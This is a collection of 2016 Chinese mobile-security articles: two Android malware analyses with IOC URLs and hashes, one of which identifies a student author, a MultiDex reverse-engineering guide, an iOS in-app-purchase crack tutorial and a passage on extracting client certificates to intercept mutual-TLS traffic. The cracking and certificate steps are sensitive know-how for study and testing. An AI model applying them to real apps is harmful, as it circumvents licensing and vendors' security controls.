"5cca9924e0c518ef8fd5974b","经常使用手机浏览器阅读小说的用户都知道，在浏览器页面经常会出现一些推广游戏应用、手机清理应用等应用推广型的弹窗广告。有时出于方便，我们也会选择直接点开这些弹窗广告进行应用下载。但这种行为并不安全，部分…","安天移动安全","经常使用手机浏览器阅读小说的用户都知道，在浏览器页面经常会出现一些推广游戏应用、手机清理应用等应用推广型的弹窗广告。有时出于方便，我们也会选择直接点开这些弹窗广告进行应用下载。但这种行为并不安全，部分恶意应用会首先伪装成“正规军”诱导用户进行下载。一旦用户下载安装成功，该应用便大肆入侵用户手机，劫持浏览器进行仿冒应用的广告推送，甚至静默安装其它未知应用。近期安天移动安全威胁情报分析团队就捕获了一例新的恶意应用Booster Cleaner。该恶意应用伪装得十分隐蔽，它表面看起来是一款“清理手机内存”的应用，与其他手机管理软件并无区别。实际上在后台，它会劫持浏览器弹出指定网页来进行广告推送，引诱用户安装仿冒应用，并且在用户毫不知情的情况下静默安装各种未知应用，给用户带来极大的隐私泄露风险和巨大的资费消耗。一、 Booster Cleaner简介· Booster Cleaner基本信息  二、 Booster Cleaner详细分析·  恶意应用运行流程图  · Booster Cleaner运行流程Booster Cleaner是怎样一步步利用用户手机”胡作非为“的呢？简单来说，分为四步：劫持浏览器推送应用→私自提权解密→回传用户隐私→静默下载安装应用。Step1.劫持浏览器推送应用Booster Cleaner利用某广告服务器上传设备信息，返回指定的url来获取推送广告的配置信息，如下图所示：恶意应用在后台持续监控用户手机顶层窗口应用包名，当包名匹配到预设的包名时，便向劫持浏览器界面推送广告，诱导用户下载未知应用，推送间隔时间为1小时。据统计，目前很多常用的浏览器都被劫持了，具体如下表所示：Step2.私自提权解密当用户下载该应用后，该应用会通过Asysset.dex文件实现提权，该dex由asysup.so释放，具体步骤如下：（1）下载aice文件解密解压释放子包和提权文件。（2）通过解密png.ico释放提权工具和锁定文件工具，下图中r1—r4分别是四种root方案，利用了CVE-2012-6442、WooYun-2013-21778、CVE-2013-6282等漏洞来进行root提权。（3）利用漏洞提权并执行脚本拷贝子包ice.apk到系统应用目录来提升子包权限。 Step3.回传用户隐私提权成功后，该应用会将提权结果信息和隐私信息上传至指定位置，同时，也会上传安装应用列表信息。具体来说，它会上传以下数据：安装应用列表信息会上传至指定位置，具体如下图代码所示：Step4.静默下载安装应用子包ice.apk主要恶意行为是：向远程服务器获取未知应用下载地址，后台私自下载未知应用，静默安装。解密数据保存在本地数据库，如下图:后台通过查询数据库获取下载列表，下载推送的应用：获取Root权限后，通过pm指令静默安装app:通过分析，目前静默安装的应用多为仿冒应用，主要仿冒应用如下表所示： · Booster Cleaner 恶意代码详解恶意代码植入模块结构如下图所示：  三、攻击者追溯· 域名该事件中涉及到了多个相关域名，通过*L Insight情报聚合，我们发现恶意应用涉及的多个域名注册者名称多为Simon。（数据来源：*L Insight移动威胁情报平台）· 主要传播途径Booster Cleaner主要在国外某些小型应用市场或者其他第三方应用市场传播，其中一些hash的来源地址如下：ufile.ucloud.com.cn/micfile/apk/6032bca0e75e4d149a6ec640221beb4e.apkrogsob.com/7/PhotoEditor012902.apkwenzhuotc.com/upload/app/apk/20160506163243/Flashlight03.apkvademobi.com/apks/a03db38c-b0ff-4c01-8f43-51f8963d35f4.apk感染量较大的包名以及应用名如表格所示：· 感染用户分布通过*L Insight平台监控，截止到2016年10月19日，已有4989例受害者信息；最近一个月，共有281例受害者信息，感染用户地区分布如下：（数据来源：*L Insight移动威胁情报平台）从图中可知，现阶段Booster Cleaner受害者多为国外用户，其中，以南亚和东南亚用户最多；从广告注册商方面来看，也是国外厂商，且广告商与应用存在密切的利益关系；从手法上来看，广告植入和运行手法都较为隐蔽，且进行了较为专业的加密处理，因此，很有可能是团伙作案。虽然，从目前来看，受害范围都在国外，但这种运作模式在国内也很常见，因此不排除部分战略技术向国内转移的可能。· 总结Booster Cleaner 恶意应用伪装成正规的内存清理软件，诱导用户下载，当用户下载安装后，该应用开始运行并偷偷窃取用户隐私信息，同时通过劫持用户手机浏览器，不断地推送未知应用广告，激起用户的好奇心，诱导用户下载。不仅如此，Booster Cleaner还会在用户不知情的情况下，静默安装大量未知应用，持续地进行更深层次的恶意行为，手段隐蔽且成本较低，让人防不胜防。值得注意的是，该恶意应用与广告商之间存在密切的利益往来，且包含上传用户隐私、推送广告等常见的可获利恶意行为。联想最近国内发生的多起电信诈骗事件，事件中的受害者被不法分子利用个人隐私信息骗取信任，后续进行诈骗行为。该应用的恶意开发者后续也存在利用窃取的隐私信息对感染用户进行精准电信诈骗的潜在可能，给感染用户财产带来极大的安全隐患。四.安全建议针对 Booster Cleaner之类的恶意应用，安天移动安全威胁情报分析团队提醒您：请保持良好的上网习惯，不要在非官方网站或者不知名应用市场下载任何应用；谨慎点击安装浏览器弹窗广告推送的应用，不安装来源不清楚的应用；不要轻易授权给不信任的软件Root权限；如果您已经中了类似病毒，建议您使用Root工具将设备进行Root，使用杀毒软件及时查杀病毒。查杀完成后，如您不再使用Root，请务必使用Root工具取消Root，避免Root权限被滥用带来的设备安全问题。安天移动安全专注于移动互联网安全技术研究及反病毒引擎研发，为合作伙伴提供强大的移动安全解决方案。*L Insight 移动威胁情报平台主要用于呈现移动威胁的高价值情报信息， 通过对移动威胁的全面感知能力和快速分析响应能力，提供应对移动威胁的预警和处置策略，为客户移动终端安全保驾护航。五. 附IOC：hash7FBA76AB76D65476180371FD66DDD3EF5613**FCA8F20669CAF58035C1F8A5B7C354EEA5366783F6C0C5A8*6FABF2AA03EC20A7AA03092818943DCCB030251A4F8F66297437B55D8F3FFFDE12249DD4D041563A21528F789D1DB95C8197724639AAB9A6FB6BF3F5DDFF47D04EB02E0B55D63F0B1A75F5E8A362D457E62A79domainhttp://api.zoomyads.com/zoomy-advert/inter/getHeartbeatInfo.shtmlhttp://cdn.6mailer.com:8080/jar/kk0512.pnghttp://54.179.132.156/zoomy-root-test/test/testapihttp://54.179.132.156/zoomy-root-test/test/uploadfilehttp://zad.zadmobi.com/mic/plhttp://ufile.ucloud.com.cn/micfile/apk/6032bca0e75e4d149a6ec640221beb4e.apkhttp://rogsob.com/7/PhotoEditor012902.apkhttp://wenzhuotc.com/upload/app/apk/20160506163243/Flashlight03.apkhttp://vademobi.com/apks/a03db38c-b0ff-4c01-8f43-51f8963d35f4.apk","2016-10-26 15:40:42","移动安全","恶意软件伪装“正规军”，撕开Booster Cleaner“画皮”下的真相","https://www.secpulse.com/archives/52649.html"
"5cca9925e0c518ef8fd5974c","注：本文为“小米安全中心”原创，作者： 瘦蛟舞 ,转载请联系“小米安全中心” 上期回顾：安全扫描自动化检测平台建设（Web黑盒下） 0x00 Who is Multidex 很多大厂的Android …","小米SRC","注：本文为“小米安全中心”原创，作者： 瘦蛟舞 ,转载请联系“小米安全中心”上期回顾：安全扫描自动化检测平台建设（Web黑盒下）0x00 Who is Multidex很多大厂的Android App因为业务量大，引用库多导致其apk包中的类于方法剧增。这样就有可能出现因为方法数过多导致编译失败的情况。产生这个问题的主因是dex文件格式的限制。一个DEX文件中method个数采用使用原生类型short来索引文件中的方法，也就是4个字节共计最多表达65536个method，field/class的个数也均有此限制。对于DEX文件，则是将工程所需全部class文件合并且压缩到一个DEX文件期间，也就是Android打包的DEX过程中，单个DEX文件可被引用的方法总数被限制为65536。为解决这个问题，谷歌推出了Multidex技术，简单来说就是将一个apk中的dex文件拆分成多个分主次先后加载，当然在这之前业界已经开始使用插件化来弱化此类问题。现在市面上也有很多Multidex和插件化两种方案都使用的app。Multidex会给逆向工程师带来如下麻烦：1.常见工具静态分析的类和方法不全2.静态分析工具因为交叉引用的问题导致反编译失败或崩溃3.动态调试中无法下断点4.hook的时候找不到制定的类和方法0x01 merge multidex在逆向apk中经常会遇到一些类丢失，反编译崩溃的情况。如果这时候去观察apk压缩包会发现其中有超过一个dex，上图中就有两个dex。那么这个app分析起来就不会很轻松了，因为这个叫dex分包的技术直接意味着你要面对超过65536个java方法。而这篇文章主要就是讲解笔者在遇到这种情况的时候一些应对手法。如果你的dex2jar版本为v2.1之前的版本，那么dex2jar就会默认转化第一个dex文件而忽略其他dex文件.52f26c6 2.1版本开始支持multidex，直接执行d2j-dex2jar.sh the-apk-witch-mutidex.apk就可以转化所有dex文件到一个jar包中。在dex2jar更新v2.1之前笔者是用的一个比较""耿直""的方法解决这个问题，因为dex的method数量有限但是jar包对method是没有特别限制的，所以我写了一个脚本将apk中多个dex先转化为jar文件之后解压缩最后合并打包压缩，同样可以得到完全的反编译文件。Android逆向中出镜率较高的jeb在早期版本v1.x也同样有类似尴尬的问题，只默认反编译第一个dex文件。但是到v2.2也开始支持multidex采用merge的方式解决多个dex的反编译问题。也就是在jeb2.2之后就可以无障碍的在multidex中使用交叉引用功能了。在很长一段时间使用jeb1.5的时候解决这个问题的办法同样也也merge多个dex的smali代码，因为要回编译至dex所以就无法突然65K方法数的限制，那么就要想办法对multidex进行瘦身。大数据情况下我们只关心其自有代码，对其依赖库往往是带过的(大多数情况是和配置文件中application或者入口Activity同路径的代码)。这里就需要选择一个较小的dex去识别去除一些依赖库和第三方sdk比如android support / google gson，然后抽取另外的dex的主包smali代码合并到较小的dex中。最后回编译至dex拖入jeb1.5中就可以正常分析了。0x02 attach multidex 在multidex的测试过程中还会出现一种情况，就是使用xposed hook其方法的时候，如果方法位于默认dex中是可以的正常hook，但是如果方法位于dex分包中xposed就会报错提示所要hook的方法所在类无法找到。要分析这个问题的原因以及解决办法，就要先了解multidex的载入过程以及xposed的hook时机。dex分包加载大致流程如下,可以得出分包是滞后主包不少时间加载的：1.检测是否有分包需要安装,系统是否支持multidex2.从apk中解压出分包3.通过反射将分包注入到当前classloader 而xposed为了能让module及时载入执行所以得尽快调用handleLoadPackage()，所以此时获取的context的classloader中只要默认dex主的包的类。因此我们得想法得到完整的上下文context,比较明显的获取完整context的hook时机有如下两处：MultiDex.install()MultiDexApplication.attachBaseContext()https://android.googlesource.com/platform/frameworks/multidex/+/master/library/src/android/support/multidex/MultiDexApplication.java而xposed的作者建议是选择android.app.Application.attach()，因为attachBaseContext是有概率被重写的不稳定.所以选择方法内调用了attachBaseContext的Application.attach()。https://github.com/android/platform_frameworks_base/blob/master/core/java/android/app/Application.java#L180示例代码如下分析到这里就可以想到一些加壳后的app无法正常hook也可能是类似原因可以用同样的方法解决(这里前提当然是能脱壳看到代码且壳没对hook做对抗，如果有对抗还是脱了之后回打包比较稳妥.)。下图这个壳同样也佐证了attachBaseContext被重写的可能，直接hook被重写的attachBaseContext也是可行的。0x03 referhttps://developer.android.com/studio/build/multidex.html#abouthttp://souly.cn/%E6%8A%80%E6%9C%AF%E5%8D%9A%E6%96%87/2016/02/25/android%E5%88%86%E5%8C%85%E5%8E%9F%E7%90%86/http://bbs.pediy.com/showthread.php?t=212332https://github.com/pxb1988/dex2jarhttps://github.com/rovo89/XposedBridge/issues/30#issuecomment-68488797http://tech.meituan.com/mt-android-auto-split-dex.htmlhttps://android.googlesource.com/platform/frameworks/multidex/+/master/library/src/android/support/multidex问题插件化这种技术会给逆向带来哪些困扰?如何解决这些问题？参与详情参与方式：点击下方“写留言”，回答上面的问题参与时间：截止至10月30日18：00获奖方式在精选留言中，选出作者满意的留言送出精美礼品（在众多留言中，择优选择部分留言移为精选留言，展示出来。所有的幸运小伙伴，都会是作者亲自选出哦~如果留言质量不高的话，我们会把礼物留到下一次做活动哦~）往期回顾：基于burp插件的安全测试证书检测二三事自动化web安全测试中、小企业如何自建免费的云WAF利用恶意软件检测服务向服务提供商植入恶意软件(二)利用恶意软件检测服务向服务提供商植入恶意软件(一)安全扫描自动化检测平台建设（Web黑盒上）安全扫描自动化检测平台建设（Web黑盒中）安全扫描自动化检测平台建设（Web黑盒下）注：本文为“小米安全中心”原创，转载请联系“小米安全中心” 【注：本文为“小米安全中心”原创  作者：瘦蛟舞  安全脉搏整理发布】","2016-10-29 16:29:38","移动安全","Android逆向随笔之遇见MultiDex","https://www.secpulse.com/archives/52719.html"
"5cca9925e0c518ef8fd5974d","黑客一直是美国电影中的重要元素，很多经典大片中都有黑客的身影，如战争游戏、黑客帝国等。电影中黑客总是神通广大、行侠仗义，《战争游戏》中的年轻黑客大卫•莱特曼利用黑客技术避免引爆核武器，《黑客帝国》中尼…","安天移动安全","黑客一直是美国电影中的重要元素，很多经典大片中都有黑客的身影，如战争游戏、黑客帝国等。电影中黑客总是神通广大、行侠仗义，《战争游戏》中的年轻黑客大卫•莱特曼利用黑客技术避免引爆核武器，《黑客帝国》中尼奥通过黑客技术摆脱虚拟世界控制。电影中的黑客们利用高超的计算机技术拯救世界，正能量爆棚，激发了无数观众对计算机的向往；但是现实生活中却有“黑客”利用计算机技术开发蠕虫病毒，攻击大众的手机，而这名黑客的真实身份，竟然是一个高中生…近期，安天*L移动安全团队和小米MIUI安全中心发现一款携带勒索功能的拦截马Trick，经过样本溯源发现，该病毒竟出自国内一名高中生之手。该病毒伪装成中国移动，以免费获取话费的短信诱惑用户下载安装。该病毒运行后会执行以下恶意行为：◆窃取用户短信并上传到指定邮箱◆根据短信指令锁定手机进行勒索◆根据远程短信指令遍历联系人，并向所有联系人群发附带恶意下载链接的钓鱼短信进行恶意传播◆一旦发现用户执行卸载此恶意软件的操作，该病毒会直接锁定用户手机，并对用户进行勒索 病毒运行流程图病毒行为详细分析窃取用户短信信息Trick病毒程序运行后，首先获取用户手机中的所有短信，以邮件正文的形式上传至指定邮箱，同时还会将短信内容写入txt文件中同步上传：通过邮箱上传，邮件标题为“短信”：通过对Trick病毒样本的溯源，我们发现了该恶意开发者的邮箱信息，在邮箱中发现大量感染用户的隐私信息，其中以各类短信验证码最为常见。虽然该病毒样本本身并没有窃取用户账户信息的功能，但是考虑到目前大量的隐私信息被泄露，恶意开发者极有可能通过其他渠道获取到感染手机QQ、微信、银行卡账户等信息，后续通过短信拦截马执行解绑、改密、转账等操作。激活设备管理器运行后，Trick病毒会诱导用户激活设备管理器：若用户成功激活设备管理器，则会提示用户重启软件：隐藏图标激活设备管理器后，Trick病毒会弹出虚假对话框，提示虚假信息“程序异常已自动卸载”，并隐藏启动图标。接收短信指令进行远控行为Trick病毒隐藏图标后继续在后台运行监听系统接收短信的广播。接收到主控手机187********发来的短信，解析此短信内容发现它会执行以下操作： 指令1：锁机锁机指令即是对用户手机进行锁定，全屏置顶一个勒索的界面，要求用户联系QQ2038******有偿解锁。指令2：短信短信指令即通过解析主控手机发送的短信，获取要发送的内容和号码，并控制用户手机在后台发送。指令3：群发群发指令即遍历用户手机中所有联系人进行短信群发，短信内容为“http://pre.im/ZxI2下载登录进去填我邀请码156941 可以领话费我已经领了30”。该网址下载的就是其自身应用，当前该链接已失效。该应用的图标为中国移动，配合钓鱼短信内容，恶意诱导性极强。实时上传短信Trick病毒通过监听系统接收短信的广告，将非主控手机发送的短信通过邮件实时上传，邮件标题为“小伟拦截马”。卸载程序锁机Trick病毒运行后会启动设备管理器，用户卸载应用之前必须先取消激活设备管理器。一旦监测到用户执行取消激活设备管理器的操作时，该病毒会直接将用户手机锁屏并勒索，勒索界面与以上锁机界面相同：第三方推送服务Trick病毒还实现了Bmob的第三方推送服务功能，在当前的程序中并没有对推送消息进行处理，可以推测在后续的版本中可能会实现执行更多的指令控制或其他功能。恶意开发者追溯1.追溯恶意开发者主控手机号码以及地域信息我们从代码静态分析中得到恶意开发者发送指令的主控手机,通过对主控手机归属地的查询，可以看到该号码号码归属地为四川德阳市：2.追溯恶意开发者SNS账号信息及姓名我们从代码静态分析中得到恶意开发者邮箱信息,在邮箱中有蒲公英应用分发平台上的账号，从中可以得知作者的名字和QQ：3.进一步判断恶意开发者身份a)通过上一追溯环节的结论，我们得到了恶意开发者的qq账号，以下是其qq账号个人资料信息。从下图可以看到，该开发者的年龄为18岁（但该信息不一定可靠），初步推断其为高中生的可能性。b)通过访问该qq对应的qq空间，我们看到其空间中展示了某渠道拦截到的受害者短信信息，为该qq与实际攻击者进行了一次强关联，也进一步保证了我们通过该qq收集的攻击者信息的可靠性。c)该空间中上传了一些学校运动会的照片，可以推断出该攻击者为一名学生。d)我们在其空间中看到了攻击者发布的学校位置的卫星图以及对应的卫星拍摄视频地址。通过查看该卫星拍摄视频，视频结尾呈现了视频制作者姓名，而该姓名与前面追溯环节所得到的攻击者姓名信息完全一致。e)更为关键的是，该卫星拍摄地图以及空间中的说说信息中，披露了一所高中的校名以及地理位置。其指向的是四川省德阳市下某县的某所高中，进一步印证了攻击者为高中生的推测。综上，我们可以推断出该恶意开发者极有可能是来自四川省德阳市下某高中的一名高中生。总结Trick病毒伪装成中国移动，以免费获取话费的钓鱼短信诱导用户下载并安装病毒。该病毒运行后窃取用户的短信内容并上传至指定邮箱，同时向联系人群发钓鱼短信进行恶意传播。此外，该病毒通过短信指令远控执行恶意行为，后续可能进一步形成僵尸网络。Trick病毒虽然没有窃取用户账户密码的恶意功能，但从恶意开发者邮箱内的短信内容可以合理推断出该恶意开发者极有可能通过其他渠道获取用户的QQ、微信、甚至银行账户等隐私信息，后续通过解绑、改密的方式登录用户账户，对用户财产造成极大的安全风险。一个出自高中生之手的病毒技术如此高明，让我们深感如今高中生信息技术水平之高的同时，也警醒我们应该加强对网络安全感兴趣的年轻人的正向引导，将他们的技术天赋应用在对抗网络攻击上，而不是开发病毒窃取别人的隐私、财产，否则黑客最终将会受到法律制裁。安全建议针对Trick拦截马病毒，集成*L反病毒引擎的MIUI安全中心已经实现全面查杀。安天*L移动安全团队和MIUI安全中心提醒您：请从正规的应用市场下载应用，不要在不知名网站、论坛、应用市场下载应用谨慎点击短信中附带的链接不要在任何场合随意泄露自身隐私信息，注重自身隐私保护建议在手机中至少安装一款杀毒软件，同时保持定期扫描的习惯 安天*L移动安全团队专注于移动互联网安全技术研究及反病毒引擎研发，为合作伙伴提供强大的移动安全解决方案。*L移动反病毒引擎致力于为企业和厂商伙伴提供针对性的移动终端威胁防护解决方案，如病毒检测、金融安全防护、上网安全防护等安全能力输出。目前除了为小米MIUI输送安全能力外，也与其他众多知名厂商达成安全侧合作，为猎豹、阿里云YunOS、OPPO、VIVO、步步高、努比亚、LBE、安卓清理大师、AMC等合作伙伴提供移动反恶意代码能力，为全球过亿终端用户保驾护航。 转载请注明来源：http://blog.avlsec.com/?p=3849更多技术文章，请关注*L Team官方微信号","2016-11-09 12:35:16","移动安全","Trick蠕虫病毒来袭！幕后主使竟是一名高中生“黑客”！","https://www.secpulse.com/archives/52942.html"
"5cca9925e0c518ef8fd5974e","本文转自脉搏战略合作伙伴先知技术社区 原帖地址  原作者: 墨眉_凌迟  安全脉搏编辑Joey整理发布 注:本次操作环境为-越狱iPhone 4s，ios8.3，app版本为1.6.6 由于厂商要求隐…","先知技术社区","本文转自脉搏战略合作伙伴先知技术社区 原帖地址  原作者: 墨眉_凌迟  安全脉搏编辑Joey整理发布注:本次操作环境为-越狱iPhone 4s，ios8.3，app版本为1.6.6由于厂商要求隐藏敏感信息，所以app名称不公开，这款app就不详细介绍了，各位看官见谅，总之这篇文章主要是给刚接触逆向面对一个陌生的app时还无从下手的新手朋友提供一个思路，小弟才学疏浅，如有纰漏，希望各位朋友积极指正，小弟洗耳恭听，与大家共同进步。首先这款app中有一个高级功能，可以进行周期性自动记账，今天的任务就是运用逆向的手段来破解它。1.1分析源代码结构，并定位关键函数1.1.1 首先使用dumpdecrypted砸壳 关于dumpdecrypted详细介绍在这里小弟就不再赘述了首先ssh到越狱的手机，只打开一个目标app，这样的目的是方便我们在接下来的步骤中定位目标app的pid，在终端执行ps -e 就可以看到当前app的进程名;linguochengde-iPhone:~ root# ps -ePID TTY TIME CMD1 ?? 0:09.72 /sbin/launchd18 ?? 0:00.03 /usr/libexec/amfid27 ?? 0:11.42 /usr/sbin/syslogd -bsd_out 1...1006 ?? 0:00.34 /System/Library/Frameworks/UIKit.framework/Support/pasteboardd1102 ?? 0:02.93 /var/mobile/Containers/Bundle/Application/7E51DAF5-3FCF-42CF-B4CB-F47C*078048/easycost.app/easycost1219 ?? 0:00.00 (bash)1220 ?? 0:00.28 (gssc)770 ttys000 0:00.06 -sh810 ttys000 0:00.30 cycript1221 ttys000 0:00.01 ps -e;因为我们的iOS设备上只打开了一个AppStore中的app，所以唯一的那个含有/var/mobile/Containers/Bundle/Application/字样的结果就是目标可执行文件的全路径。  我们找到目标app进程的pid是1102，输入Cycript -p 1102，这时，Cycript就已经运行在目标app中了1.1.2 class-dump获取.h头文件在砸壳后文件的目录下，我们执行`class-dump --arch armv7 -S -s -H 可执行文件 -o 自定义的文件夹路径`，获得砸壳后的头文件1.1.3 cycript打印视图层次Cycript是由saurik推出的一款脚本语言，更多资详细资料可以查看它的官网http://www.cycript.org ,可以从MTerminal中执行Cycript，也可以ssh到ios设备中执行Cycript我们首先根据上文介绍的方法向目标app注入Cycript紧接着我们找到这个付费功能具体实现的界面，也就是在“周期记账”选项所在的界面中，输入 UIApp.keyWindow.recursiveDescription().toString()，来打印当前的视图层次这里看到有好多东西，这时候需要大致浏览看有没有关键信息，突然看到一个KLSwitch,再看到前面“周期记账”的开关是一个UISwitch，于是我们先把注意力放在这个KLSwitch上面。这时候我们的思路是:我们可以先根据这个KLSwitch，先找到他的controller，由于这里的switch是一个对象，而这个界面是一个view，所以我们可以通过nextResponder追溯到它的controller，然后再从之前class-dump出来的头文件中查找这个controller，找一找是否有关键信息例如xxxSwitch之类的，通过我们找到的controller来响应这个switch，看看我们的猜想是否正确。首先，先通过KLSwitch找到它的Controller，然后在class-dump中的头文件中找到它，打开后查找带有switch字样的函数我们在 CatalogInfoViewController.h这个文件中找到了cycleSwitch这个函数，我们来通过 CatalogInfoViewController来响应它，看看这个switch到底是不是我们要找的switch结果不出意料，在执行了[#0x14d00820 cycleSwitch:YES]之后，提醒购买的弹框弹了出来，这就初步确定了我们的目标函数并且也确定了CatalogInfoViewController这个controller，在接下来的操作中我们会用到它1.1.4 debugserver+lldb动态调试确认关键函数接下来该我们该祭起debugserver和lldb了debugserver运行在iOS设备上，顾名思义，它作为服务端，实际执行LLDB（作为客户端）传过来的命令，再把执行结果反馈给LLDB，显示给用户，即所谓的“远程调试”。通过命令image list -o -f 查看它的ASLR偏移我们可以看到它的ASLR偏移为0x0003c000紧接着我们把之前砸壳后得到的文件拖进hopper或ida，搜索前面得到的CatalogInfoViewController ，大致浏览一遍，可以看到有一个[CatalogInfoViewController cycleSwitch]这和我们之前的猜想不谋而合，也就是说这里肯定有问题 这时候下面的一个isPurchased （购买）引起了我的注意，我想要看看这个isPurchased到底做了什么事情，究竟是不是我们猜想的那样，于是在函数开始时(0x0004fdf0)打断点,由于之前看到ASLR偏移为0x0003c000，所以要把他们相加才是函数偏移后的地址进入到函数中后，一直使用ni命令，直到函数到这里打印r0,发现参数为nil，我们来尝试着把r0的值改为1，然后我们发现这时候就可以使用我们的所谓“周期记账”的高级功能了，当然这还没完，现在这里只是确定目标函数以及参数，接下来我们就开始最关键也最必不可少的一步，就是用theos来编写tweak1.2编写tweak我们首先在导出的头文件中查找isPurchased，找到Purchased.h文件\然后我们在打开的Purchased.h文件中找到@property(nonatomic,getter=isPurchased,setter=setPurchased:) BOOL purchased,我们把这个purchased永久返回1，应该就可以完成我们的任务了。继续，新建工程 编辑makefile然后继续编辑tweak打包编译安装到越狱手机，就可以看到我们可以使用所谓的高级功能了。2.0关于防护措施杂谈俗话说得好，有攻就有防，ios安全防护措施虽说没有安卓这么多，但也有逐渐发展的趋势，小弟觉得首先一个原因可能是国内代码混淆技术没有普及，而且大多数app也只有核心功能才会被混淆，不然全文混淆的话运行过程中的内存加解密也是很大的开销。关于防护措施，较为普遍的就是引入动态防护组件，个人觉得x维安全相对做的还不错，就目前来说绝大多数app连基本的反调试功能都没有，引入动态防护组件，可以一定程度上防止动态注入、动态调试，方法名类名混淆等，还有关于llvm的一些东西，如在IR层实现一些混淆逻辑，加入各种跳转各种无用逻辑但又不会影响原有的程序逻辑，具体可以参考https://github.com/obfuscator-llvm/obfuscator/，不过挺久没维护了需要自己大动干戈折腾一番，对个人能力要求较高，而且IR层的混淆本身问题较多可能使app存在很多潜在的bug，并且在一定程度上可以被还原，所以只要能做到以上的一些，可以防止新手逆向，在一定程度上已经把很多人挡在了外面。ps：黑灰产朋友应该感谢微信没做防护措施。除了这些当然还有其他方面的防护措施，随着计算机的发展安全也会越来越被重视，对ios逆向感兴趣推荐@大名狗剩的《ios应用逆向工程》以及论坛bbs.iosre.com，微博：看雪iOS小组，欢迎前来交流。小结本文为这款记账软件制作了去除高级功能限制插件，让我们可以更全面的使用这款app，虽然最后的代码只有几行，但整个分析过程却是一环扣一环，哪怕其中一环出错不注意就会被误导，逆向这款app虽然说挺简单的，但主要希望能为正在学习逆向并且自己对心仪的app无从下手的朋友提供一些帮助。有些朋友觉得本文运气成分很大，没错，逆向工程不比app开发，没有官方文档作为参考，最有效的方式就是不断尝试，不断犯错，再不断改进，我们面对的总是一些未知的东西，或许你离成功只差一步，但却因为看不到前方，而走向一条更困难的路，我们在计算机的行业里只有不断探索，才有可能逐渐超越自我，小弟也是初学逆向，对自己说也对路上的朋友说，愿我们在探索的道路上一直勇敢下去。 【本文转自脉搏战略合作伙伴先知技术社区 原帖地址  原作者: 墨眉_凌迟  安全脉搏编辑Joey整理发布】","2016-12-13 15:51:09","移动安全","某记账App iOS客户端内购破解","https://www.secpulse.com/archives/53993.html"
"5cca9925e0c518ef8fd5974f","本文由wadcl原创投稿安全脉搏，安全脉搏独家发表本文，如需要转载，请先联系安全脉搏授权；未经授权请勿转载。以前给一家证券机构做测试，第一次碰到了服务器双向认证的问题，当时双向认证的概念还没有推广开来…","wadcl","本文由wadcl原创投稿安全脉搏，安全脉搏独家发表本文，如需要转载，请先联系安全脉搏授权；未经授权请勿转载。以前给一家证券机构做测试，第一次碰到了服务器双向认证的问题，当时双向认证的概念还没有推广开来，所以折腾了很久，虽然当时不知道原理，但是也算是解决了双向认证走代理的问题了。前段时间，碰到了一个apk，想抓包看看数据，发现用的也是双向认证，所以就折腾了一下。当服务器启用了双向认证之后，除了客户端去验证服务器端的证书外，服务器也同时需要验证客户端的证书，也就是会要求客户端提供自己的证书，如果没有通过验证，则会拒绝连接，如果通过验证，服务器获得用户的公钥。正式因为如此，双向认证以便都是企业内部或者证券、银行等这类用户使用，而如何保证证书的合法和保密性，就不可能通过一个公开接口去提供给访问者下载，所以一般都是放入usb-key中，或者是提供一个身份认证接口，认证通过后，可以下载安装，但是一般不会如此使用，这样的话，使用者多个电脑都安装的话，其他人也就可以使用了，所以保证唯一性，大部分都会采用usb-key的方式，所以也就限制了双向认证的使用，但是这几年手机端应用的推广，和安全的推进，很多企业在apk中直接封装了客户端的证书，使得我们想对app基于行为的安全检测，无法成功。突破证书限制所以相比于单项的认证，其实也就是多了一个服务器端验证客户端证书的过程，而在以往的用代理工具如burp和fiddler这一类工具，抓取https的包时，除了浏览器获取的是代理工具的证书外，默认是不发送证书给服务器端的，而其实代理工具也提供了双向认证的证书发送，如fiddler的ClientCertificate.cer证书。只要提供了客户端的证书，也就实现了双向认证的破解过程。所以重点在于如何提取出证书来。 WEB应用上证书的提取最简单的一种就是，直接安装证书，或者使用时查看证书属性，在双向认证中一般会弹出此框，或者usb-key中如果有导入证书的功能的话更好，一般安全系数高的话，是会设置各种门槛阻止你获取证书的。 点击后直接安装：安装完成后，就可以直接导出证书了。或者直接通过keytools工具来生成证书。 安卓APP下的证书 在应用中嵌入证书，使得每次请求都读取证书并发送，这样做，证书一般就需要和安卓应用一起打包，甚至放置的trustStore信任集，就需要密码来单独提取和安装证书了。拿到apk包，首先需要解压出来内部的文件：可以搜索一些证书的后缀文件，例如cer/p12/pfx等，一般安卓下的为bks，也可以先去assets或者res目录下去找找。例如我碰到的apk就在assets目录下存放：我们双击p12安装一下，提示需要私钥密码：用java代码模拟双向认证的请求的过程：        // 双向认证证书        KeyStore keyStore = KeyStore.getInstance(""PKCS12"");        KeyStore trustStore = KeyStore.getInstance(""jks"");        // keyStore是服务端验证客户端的证书，trustStore是客户端的信任证书        InputStream ksIn = new FileInputStream(""E:/Java/jre8/lib/security/re/1.pfx"");        InputStream tsIn = new FileInputStream(new File(""E:/Java/jre8/lib/security/re/1""));        keyStore.load(ksIn, ""123456"".toCharArray());        SSLContext sslContext = SSLContexts.custom().loadTrustMaterial(trustStore, new TrustSelfSignedStrategy())                .loadKeyMaterial(keyStore, ""123456"".toCharArray()).setSecureRandom(new SecureRandom()).useSSL().build();        ConnectionSocketFactory pSocketFactory = new PlainConnectionSocketFactory();        SSLConnectionSocketFactory sslConnectionSocketFactory = new SSLConnectionSocketFactory(sslContext);        Registry&lt;ConnectionSocketFactory&gt; r = RegistryBuilder.&lt;ConnectionSocketFactory&gt; create()                .register(""http"", pSocketFactory).register(""https"", sslConnectionSocketFactory).build();        PoolingHttpClientConnectionManager secureConnectionManager = new PoolingHttpClientConnectionManager(r);        HttpClientBuilder secureHttpBulder = HttpClients.custom().setConnectionManager(secureConnectionManager);        HttpClient client = secureHttpBulder.build();        HttpGet httpGet = new HttpGet(""https://xxx.com"");        HttpResponse httpResponse1 = client.execute(httpGet);反编译了代码后，发现被加固过，于是想脱壳，用了网上说的动态脱壳，不知道是不是水平问题，还是这个方法已经过去式了，反正没有成功，那咋办呢？想到一个取巧的方法，直接搜历史app版本的记录，首先确定那个app之后开始时https的访问请求，然后在看这个app有没有加固过，最终是找到了一个年初的版本，这个版本已经开始使用了https，但是还没有完美的加固，至于历史版本，官网几乎删除了，不过有很多应用商店，如豌豆荚。(脉搏小编：历史版本这个取巧方法不错）app依然有些地方被混淆了，不过无所谓，因为混淆代码一般混淆的都是自己编译的方法和类，向调用证书的函数方法，一般是组件类的，尝试的找了一下，总有一些蛛丝马迹： 